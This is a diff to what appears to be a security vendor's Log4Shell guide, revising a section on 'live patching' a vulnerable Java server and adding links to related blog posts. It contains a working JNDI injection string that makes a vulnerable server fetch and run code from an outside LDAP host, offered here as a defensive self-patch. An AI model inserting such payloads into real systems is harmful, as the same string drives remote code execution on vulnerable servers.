@@ -306,12 +306,19 @@ Because of the extensive control Log4Shell gives an attacker, it's actually poss
 This isn't the recommended strategy for various reasons, but it could be a last resort for systems that you can't easily restart or modify.  Note that doing this on a system 
 you don't have permission to is most likely illegal. The fix will only work until the server (or the JVM) is restarted.
 
-You use our hosted version here to patch yourself:
+We've published articles about this exploit that you can use to learn more about how it works.
+- **[Overview (When to use it)](https://www.lunasec.io/docs/blog/log4shell-live-patch/)**,
+- **[Technical Deep-dive](https://www.lunasec.io/docs/blog/log4shell-live-patch-technical)**
+
+#### Hosted Exploit Payload
+
 ```
 ${jndi:ldap://patch.log4shell.com:1389/a}
 ```
 
-Just simply paste that anywhere into your server where you're vulnerable, and it will work. (For example, in the `main` function when you start up your server)
+Using this will patch your server against future exploitation _until it restarts_. Just simply paste that anywhere into
+your server where you're vulnerable to use it. For example, in the `main` function when you start up your server, or a known
+vulnerable field if it's a vendor product you depend on.
 
 We have added this functionality to the [latest release](https://github.com/lunasec-io/lunasec/releases) of our
 Log4Shell CLI tool if you'd prefer to run the server yourself instead.
@@ -324,8 +331,6 @@ until you can apply a more permanent patch for Log4Shell.
 If you need a permanent solution for Log4Shell, please check out our commercial
 [Live Patch service](https://www.lunasec.io/pages/live-dependency-patching) for a production-ready alternative.
 :::
-
-How it works and how to accomplish it manually is explained in [this guide](https://github.com/Cybereason/Logout4Shell). Our implementation is based on the work they did.
 
 ## How to protect yourself from future 0-days
 
@@ -439,6 +444,14 @@ import ContactForm from '../src/components/ContactForm.jsx'
 
 <ContactForm/>
 
+### Additional Information
+
+We have published a series of posts about Log4Shell on our blog that you might be interested in:
+- **[Original Log4Shell Announcement](https://www.lunasec.io/docs/blog/log4j-zero-day/)**,
+- **[Explanation of the 2nd Log4j CVE](https://www.lunasec.io/docs/blog/log4j-zero-day-update-on-cve-2021-45046/)**,
+- **[Part 1: Log4Shell Live Patch (Background Context)](https://www.lunasec.io/docs/blog/log4shell-live-patch/)**,
+- **[Part 2: Log4Shell Live Patch (Technical Deep-Dive)](https://www.lunasec.io/docs/blog/log4shell-live-patch-technical/)**
+
 #### Limited Offer: Free Security Assistance
 
 We're also currently offering a free 30-minute consultation with one of our Security Engineers. If you're interested,
@@ -477,3 +490,4 @@ If you would like to contribute, or notice any errors, this post is an Open Sour
 6. Added link to 2nd CVE info.
 7. Added info about hot patching, and links to new releases.
 8. Update info about patching strategies.
+9. Added links to other blog posts.
